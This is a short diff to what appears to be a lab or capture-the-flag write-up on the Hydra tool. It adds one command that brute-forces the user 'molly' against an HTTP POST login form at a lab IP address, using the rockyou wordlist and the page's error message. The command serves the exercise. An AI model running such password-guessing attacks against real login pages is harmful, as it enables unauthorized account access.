@@ -85,9 +85,8 @@ EXAMPLE :
 When we enters wrong passwords it gives ==`Your username or password is incorrect`== error.
 
 ```
-
+hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.48.162.202 http-post-form "/:username=^USER^&password=^PASS^:Your username or password is incorrect."
 ```
-
 
 ## SSH
 
